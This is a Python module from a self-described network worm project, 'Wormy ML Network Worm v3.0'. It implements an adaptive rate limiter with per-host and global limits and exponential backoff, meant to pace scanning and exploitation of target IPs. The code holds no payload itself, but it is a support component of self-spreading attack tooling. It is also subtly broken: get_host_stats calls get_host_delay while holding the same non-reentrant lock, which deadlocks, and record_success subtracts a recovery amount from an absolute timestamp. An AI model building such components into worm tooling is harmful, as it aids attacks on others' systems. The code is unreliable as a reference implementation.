"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Smart Rate Limiter
Adaptive rate limiting for scanning and exploitation
"""


import threading
import time
from collections import defaultdict, deque
from typing import Dict, Optional


class SmartRateLimiter:
    """
    Adaptive rate limiter that adjusts based on target response patterns

    Features:
    - Per-host rate limiting
    - Global rate limiting
    - Exponential backoff on failures
    - Automatic recovery
    - Response time tracking
    """

    def __init__(
        self,
        global_max_rate: float = 100.0,
        host_max_rate: float = 10.0,
        backoff_base: float = 1.0,
        backoff_max: float = 60.0,
        recovery_rate: float = 0.5,
    ):
        self.global_max_rate = global_max_rate
        self.host_max_rate = host_max_rate
        self.backoff_base = backoff_base
        self.backoff_max = backoff_max
        self.recovery_rate = recovery_rate

        # Per-host tracking
        self._host_timestamps: Dict[str, deque] = defaultdict(lambda: deque(maxlen=100))
        self._host_backoff: Dict[str, float] = defaultdict(float)
        self._host_failures: Dict[str, int] = defaultdict(int)
        self._host_response_times: Dict[str, deque] = defaultdict(lambda: deque(maxlen=20))

        # Global tracking
        self._global_timestamps = deque(maxlen=1000)
        self._lock = threading.Lock()

    def should_proceed(self, target_ip: str) -> tuple:
        """
        Check if an action should proceed

        Returns:
            (allowed: bool, delay: float)
        """
        with self._lock:
            now = time.time()

            # Check host backoff
            backoff_until = self._host_backoff.get(target_ip, 0)
            if now < backoff_until:
                delay = backoff_until - now
                return False, delay

            # Check host rate
            host_timestamps = self._host_timestamps[target_ip]
            self._cleanup_timestamps(host_timestamps, now)
            if len(host_timestamps) >= self.host_max_rate:
                oldest = host_timestamps[0]
                delay = 1.0 - (now - oldest)
                if delay > 0:
                    return False, delay

            # Check global rate
            self._cleanup_timestamps(self._global_timestamps, now)
            if len(self._global_timestamps) >= self.global_max_rate:
                oldest = self._global_timestamps[0]
                delay = 1.0 - (now - oldest)
                if delay > 0:
                    return False, delay

            return True, 0.0

    def record_success(self, target_ip: str, response_time: float = 0.0):
        """Record a successful action"""
        with self._lock:
            now = time.time()
            self._host_timestamps[target_ip].append(now)
            self._global_timestamps.append(now)

            # Track response time
            if response_time > 0:
                self._host_response_times[target_ip].append(response_time)

            # Reduce backoff on success
            current_backoff = self._host_backoff.get(target_ip, 0)
            if current_backoff > 0:
                new_backoff = max(0, current_backoff - self.recovery_rate)
                self._host_backoff[target_ip] = new_backoff

            # Reset failure count
            self._host_failures[target_ip] = 0

    def record_failure(self, target_ip: str):
        """Record a failed action - triggers backoff"""
        with self._lock:
            now = time.time()
            self._host_timestamps[target_ip].append(now)
            self._global_timestamps.append(now)

            # Increase failure count
            self._host_failures[target_ip] += 1
            failures = self._host_failures[target_ip]

            # Exponential backoff
            backoff = min(self.backoff_base * (2 ** (failures - 1)), self.backoff_max)
            self._host_backoff[target_ip] = now + backoff

    def record_response_time(self, target_ip: str, response_time: float):
        """Record response time for adaptive rate adjustment"""
        with self._lock:
            self._host_response_times[target_ip].append(response_time)

    def get_host_delay(self, target_ip: str) -> float:
        """Get recommended delay for a host based on response patterns"""
        with self._lock:
            times = self._host_response_times.get(target_ip, deque())
            if len(times) < 3:
                return 0.0

            avg_time = sum(times) / len(times)
            # Recommend delay of 2x average response time
            return max(0.1, avg_time * 2)

    def get_host_stats(self, target_ip: str) -> Dict:
        """Get rate limiting stats for a host"""
        with self._lock:
            now = time.time()
            timestamps = self._host_timestamps.get(target_ip, deque())
            self._cleanup_timestamps(timestamps, now)

            times = self._host_response_times.get(target_ip, deque())
            avg_response = sum(times) / len(times) if times else 0

            return {
                "requests_last_second": len(timestamps),
                "failures": self._host_failures.get(target_ip, 0),
                "backoff_remaining": max(0, self._host_backoff.get(target_ip, 0) - now),
                "avg_response_time": avg_response,
                "recommended_delay": self.get_host_delay(target_ip),
            }

    def reset_host(self, target_ip: str):
        """Reset rate limiting for a host"""
        with self._lock:
            self._host_timestamps[target_ip].clear()
            self._host_backoff[target_ip] = 0
            self._host_failures[target_ip] = 0
            self._host_response_times[target_ip].clear()

    def _cleanup_timestamps(self, timestamps: deque, now: float):
        """Remove timestamps older than 1 second"""
        cutoff = now - 1.0
        while timestamps and timestamps[0] < cutoff:
            timestamps.popleft()

    def get_global_stats(self) -> Dict:
        """Get global rate limiting stats"""
        with self._lock:
            now = time.time()
            self._cleanup_timestamps(self._global_timestamps, now)
            return {
                "global_requests_per_second": len(self._global_timestamps),
                "global_max_rate": self.global_max_rate,
                "hosts_tracked": len(self._host_timestamps),
                "hosts_on_backoff": sum(1 for ip, t in self._host_backoff.items() if now < t),
            }
